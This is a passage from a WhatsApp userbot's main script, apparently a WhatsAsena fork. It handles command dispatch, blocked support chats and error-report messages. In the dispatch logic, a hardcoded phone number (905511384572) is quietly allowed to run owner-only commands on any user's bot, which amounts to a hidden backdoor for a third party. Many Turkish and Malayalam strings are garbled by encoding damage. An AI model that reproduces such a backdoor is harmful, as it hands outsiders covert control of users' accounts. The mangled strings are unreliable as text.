            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 
*/
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '*-- HATA RAPORU [WHATSASENA] --*' + 
                                    '\n*WhatsAsena bir hata ger莽ekle艧ti!*'+
                                    '\n_Bu hata logunda numaran谋z veya kar艧谋 bir taraf谋n numaras谋 olabilir. L眉tfen buna dikkat edin!_' +
                                    '\n_Yard谋m i莽in Telegram grubumuza yazabilirsiniz._' +
                                    '\n_Bu mesaj sizin numaran谋za (kaydedilen mesajlar) gitmi艧 olmal谋d谋r._' +
                                    '\n_Hatay谋 https://chat.whatsapp.com/BPNzFEBUVbT1MnfNv3uTvL bu gruba iletebilirsiniz._\n\n' +
                                    '*Ger莽ekle艧en Hata:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false});

                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Only Absolutely URLs Supported_' +
                                        '\n*Nedeni:* _Medya ara莽lar谋n谋n (xmedia, sticker..) LOG numaras谋nda kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _LOG numaras谋 hari莽 herhangi bir sohbette komut kullan谋labilir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _SQL Database Error_' +
                                        '\n*Nedeni:* _Database\'in bozulmas谋._ ' +
                                        '\n*Solution:* _Bilinen herhangi bir 莽枚z眉m眉 yoktur. Yeniden kurmay谋 deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
                                        '\n*Nedeni:* _Grup adminlerinin kullanabildi臒i komutlar谋n ara s谋ra split fonksiyonunu g枚rememesi._ ' +
                                        '\n*脟枚z眉m眉:* _Restart atman谋z yeterli olacakt谋r._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Speedtest verilerinin sunucuya iletilememesi._' +
                                        '\n*脟枚z眉m眉:* _Bir kez daha kullan谋rsan谋z sorun 莽枚z眉lecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Nedeni:* _TTS komutunun latin alfabesi d谋艧谋nda kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _Komutu latin harfleri 莽er莽evesinde kullan谋rsan谋z sorun 莽枚z眉lecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Pluginin yanl谋艧 kodlanmas谋._' +
                                        '\n*脟枚z眉m眉:* _L眉tfen plugininin kodlar谋n谋 kontrol edin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Heroku plugini alt谋ndaki komutlar谋n kullan谋lmas谋 sonucu sunucu ile ileti艧ime ge莽ilememesi._' +
                                        '\n*脟枚z眉m眉:* _Biraz bekleyip tekrar deneyin. Hala hata al谋yorsan谋z internet sitesi 眉zerinden i艧lemi ger莽ekle艧tirin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlar谋n谋n kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _Bu hatan谋n 莽枚z眉m眉 yoktur. 脰nemli bir hata de臒ildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlar谋n谋n kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _Bu hatan谋n 莽枚z眉m眉 yoktur. 脰nemli bir hata de臒ildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Tam nedeni bilinmiyor. Birden fazla se莽enek bu hatay谋 tetiklemi艧 olabilir._' +
                                        '\n*脟枚z眉m眉:* _Bir kez daha kullan谋rsan谋z d眉zelebilir. Hata devam ediyorsa restart atmay谋 deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Pluginin yanl谋艧 kullan谋m谋._' +
                                        '\n*脟枚z眉m眉:* _L眉tfen komutlar谋 plugin a莽谋klamas谋nda yazd谋臒谋 gibi kullan谋n._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutlar谋n latin alfabesi d谋艧谋nda kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _Komutu latif alfabesi 莽er莽evesinde kullan谋rsan谋z sorun 莽枚z眉lecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [WHATSASENA] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanl谋艧 girilmesi._' +
                                        '\n*脟枚z眉m眉:* _L眉tfen silmek istedi臒iniz pluginin ba艧谋na_ *__* _koymadan deneyin. Hala hata al谋yorsan谋z ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*馃檱馃徎 Maalesef Bu Hatay谋 Okuyamad谋m! 馃檱馃徎*' +
                                        '\n_Daha fazla yard谋m i莽in grubumuza yazabilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] --*' + 
                                    '\n*饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐 an error has occurred!*'+
                                    '\n*This error log may include your number or the number of an opponent. Please be careful with it!*' +
                                    '\n*啻膏祤嗟� 啻囙床嗟嵿床啻距搐嗟嵿搐 error 啻嗋矗嗟�.*' +
                                    '\n*Aslo you can join our support group:* https://chat.whatsapp.com/G18G7QjUqi6GqkWvUwre4u' +
                                    '\n*This message should have gone to your number (saved messages).*\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*鈿曪笍 ERROR ANALYSIS [饾悜饾悁饾悊饾悁饾悕饾悗饾悜饾悐] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*馃檱馃徎啻膏祤嗟� 啻囙床嗟嵿床啻距搐嗟嵿搐 error 啻嗋矗嗟嶐煓囸煆�*' +
                                        '\n_You can write to our support group for more help /n https://chat.whatsapp.com/G18G7QjUqi6GqkWvUwre4u'
                                        , MessageType.text
                                    );
                                }    
                            }                      
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Eski s眉r眉m stringiniz yenileniyor...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
